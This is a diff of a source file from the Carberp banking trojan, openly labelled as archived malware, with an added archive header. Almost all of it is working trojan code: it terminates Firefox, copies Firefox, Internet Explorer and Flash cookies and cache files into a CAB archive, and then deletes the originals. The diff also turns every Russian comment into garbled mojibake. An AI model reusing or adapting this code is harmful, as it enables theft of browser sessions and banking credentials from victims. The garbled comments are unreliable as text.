@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "windows.h"
 #include "coocksol.h"
 #include "GetApi.h"
@@ -28,28 +39,28 @@ bool DeleteFiles(PCHAR Path, PCHAR Ext, bool Recursive, bool DeleteSubDir, HCAB 
 
 bool IgnorePath(char *Path)
 {
-	// Функция вернёт истину в случае если путь один из ".", ".."
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ ".", ".."
 	return (m_lstrcmp(Path, ".") == 0) || (m_lstrcmp(Path,"..") == 0);
 }
 
 
 bool DeleteInSubDirectories(PCHAR Path, PCHAR Mask, bool DeleteSubDir, HCAB hCab)
 {
-	// Функция рекурсивно удаляет файлы в поддиректориях
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR SearchMask = StrNew(2, Path, "*.*");
     bool Result = false;
-	//  Запусукаем поиск
-	//  Ищем первую директорию
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	//  пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	WIN32_FIND_DATA Find;
 	HANDLE File = pFindFirstFileA(SearchMask, &Find);
-	//  Директория не найдена, выходим из функции
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (File == INVALID_HANDLE_VALUE)
 	{
 		StrFree(SearchMask);
 		return false;
 	}
 
-	// Организовываем цикл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	do
 	{
 		if ((Find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0 && !IgnorePath(Find.cFileName))
@@ -72,14 +83,14 @@ bool DeleteInSubDirectories(PCHAR Path, PCHAR Mask, bool DeleteSubDir, HCAB hCab
 
 bool DeleteFiles(PCHAR Path, PCHAR Ext, bool Recursive, bool DeleteSubDir, HCAB hCab)
 {
-	// Функция удаляет файлы с расширением Ext из директории Path
-	// Возвращает общий размер удалённых файлов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Ext пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Path
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Path == NULL || Ext == NULL)
 		return 0;
 	bool Result = false;
 
-	// В связи с тем, что могут использованы маски при которых
-	// директории находиться не будут,  директории обрабатываем отдельно
+	// пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ,  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Recursive)
 		Result = DeleteInSubDirectories(Path, Ext, DeleteSubDir, hCab);
 
@@ -92,19 +103,19 @@ bool DeleteFiles(PCHAR Path, PCHAR Ext, bool Recursive, bool DeleteSubDir, HCAB 
 		StrFree(Mask);
 		return Result;
 	}
-	// Перебираем найденные файлы
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	while (File != NULL)
 	{
         if ((Search.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
 		{
-			// Удаляем файл
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			PCHAR FileName = StrNew(2, Path, Search.cFileName);
-			//  В случае если файл имеет атрибут "Только чтение" меняем
-			//  ему атрибуты
+			//  пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ" пїЅпїЅпїЅпїЅпїЅпїЅ
+			//  пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			if ((Search.dwFileAttributes & FILE_ATTRIBUTE_READONLY) != 0)
 				pSetFileAttributesA(FileName, FILE_ATTRIBUTE_ARCHIVE);
 
-			// Удаляем файл
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			if(hCab != NULL && !AddFileToCab(hCab, FileName, FileName))
 			//if(ZipAdd(hZip, rel, abs, 0, ZIP_FILENAME)!=ZR_OK)
 			{
@@ -118,11 +129,11 @@ bool DeleteFiles(PCHAR Path, PCHAR Ext, bool Recursive, bool DeleteSubDir, HCAB 
 			StrFree(FileName);
         }
 
-		// Получаем следцющий файл
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		if (!(BOOL)pFindNextFileA(File, &Search)) break;
 	}
 
-	// Освобождаем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	StrFree(Mask);
 	pFindClose(File);
 
@@ -131,13 +142,13 @@ bool DeleteFiles(PCHAR Path, PCHAR Ext, bool Recursive, bool DeleteSubDir, HCAB 
 
 bool ClearDirectory(PCHAR Path, HCAB hCab)
 {
-	// Функция очищает директорию удаляя из неё все файлы и поддиректории
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	return DeleteFiles(Path, "*", true, true, hCab);
 }
 
 PCHAR GetAppDataPath()
  {
-	 // Функция возвращает путь к директории хранения данных приложений
+	 // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	char Path[MAX_PATH];
 	DWORD Size = MAX_PATH;
 	if (!(BOOL)pSHGetSpecialFolderPathA(NULL, &Path[0], CSIDL_APPDATA, Size))
@@ -150,18 +161,18 @@ PCHAR GetAppDataPath()
 
 void KillFireFox()
 {
-	DWORD Hash_FireFox = 0x7712FEAE; // хеш firefox.exe
+	DWORD Hash_FireFox = 0x7712FEAE; // пїЅпїЅпїЅ firefox.exe
 
-	// Получаем идентификатор процесса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD Pid = GetProcessIdByHash(Hash_FireFox);
 
 	if ( Pid != (DWORD)-1)
-		pWinStationTerminateProcess(NULL, Pid , DBG_TERMINATE_PROCESS );//срочно мочим
+		pWinStationTerminateProcess(NULL, Pid , DBG_TERMINATE_PROCESS );//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 }
 
 bool DeleteFFCookies(HCAB hCab)
 {
-	//	 Функция цдаляет файл куков браузера Mozilla Firefox
+	//	 пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Mozilla Firefox
 	PCHAR DataPath = GetAppDataPath();
 	if (DataPath == NULL)
 		return false;
@@ -180,15 +191,15 @@ bool DeleteFFCookies(HCAB hCab)
 
 bool DeleteSOL(HCAB hCab)
 {
-	// Функция удаляет кукисы программы Macromedia FlashPlayer
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Macromedia FlashPlayer
 	PCHAR DataPath = GetAppDataPath();
 	if (DataPath == NULL)
 		return false;
 
-	// Создаём путь к папке кукисов
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR Path = StrNew(2, DataPath, "Macromedia\\Flash Player\\");
 	StrFree(DataPath);
-	// Чистим директории
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	bool Result = ClearDirectory(Path, hCab);
 	Result = Result | DeleteFiles("C:\\WINDOWS\\system32\\Macromed\\", "*.sol", true, false, hCab);
 
@@ -197,7 +208,7 @@ bool DeleteSOL(HCAB hCab)
 }
 void IEClearCache()
 {
- // Функция очищает кэш интернет експлорера. 
+ // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. 
  BOOL bResult = FALSE;
  BOOL bDone = FALSE;
 
@@ -249,7 +260,7 @@ void IEClearCache()
     else
     {
      dwError  = (DWORD)pGetLastError();
-     dwEntrySize = dwTrySize; // возвращаем новый размер буфера
+     dwEntrySize = dwTrySize; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
     }
 
    break;
@@ -378,7 +389,7 @@ void DeleteIE_cookies(char* os, HCAB hCab)
 void WINAPI DeleteBrowsersCookies()
 {
 	/*
-	// Фцнкция удаляет кукисы браузеров и Macromedia Flash Player
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ Macromedia Flash Player
 	IEClearCache();
 	DeleteIECookies(1);
 	DeleteIECookies(2);
@@ -389,7 +400,7 @@ void WINAPI DeleteBrowsersCookies()
 	//IEClearCache();
 	char *Path = GetTempNameA();
 	HCAB hCab = CreateCab(Path);
-	// Фцнкция удаляет кукисы браузеров и Macromedia Flash Player
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ Macromedia Flash Player
 		//DeleteIE_cookies("Windows Vista");
 		DeleteIECookies(1, hCab);
 		DeleteIECookies(2, hCab);
@@ -443,7 +454,7 @@ void WINAPI DeleteBrowsersCookies()
 }
 
 /************************************************************************/
-//* Надо ещё сделать парную для MemAlloc очистку памяти в этой процедуре*/
+//* пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ MemAlloc пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ*/
 BOOL Delete_IECookies_Norm(BOOL bDeleteCookies, BOOL bDeleteCookiesIndex)
 {
 	DbgMsg("Delete_IECookies_Norm",0,"START");
@@ -587,10 +598,10 @@ BOOL Delete_IECookies_Norm(BOOL bDeleteCookies, BOOL bDeleteCookiesIndex)
 }
 
 /************************************************************************/
-// Описание удаление куков здесь: 
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ: 
 // http://social.msdn.microsoft.com/Forums/en/ieextensiondevelopment/thread/ce81943b-32b8-437b-b620-171c3d5893e7
-// Эта функция - аналог "RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2"
-// и ф-ии ResetIEtoDefaults оттуда же
+// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅ "RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2"
+// пїЅ пїЅ-пїЅпїЅ ResetIEtoDefaults пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ
 BOOL Delete_IECookies_Vista()
 {
 	BOOL res = false;
